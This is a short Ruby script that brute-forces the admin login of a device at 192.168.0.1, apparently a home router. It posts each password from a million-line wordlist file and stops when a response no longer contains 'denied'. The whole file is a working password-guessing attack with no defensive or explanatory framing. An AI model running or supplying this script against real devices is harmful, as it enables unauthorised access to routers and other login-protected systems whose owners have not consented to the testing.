require 'net/http'
require 'uri'

def is_wrong_password? password
uri = URI.parse 'http://192.168.0.1'
response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
response.include? "denied" # true means password is wrong
end

input = File.open "passwords1000000.txt", "r"

while (line = input.gets)
  line.strip!
  print "Trying password #{line}..."
  if is_wrong_password? line
    puts "Error"
  else
    puts "Correct!"
    input.close
    exit
  end
end
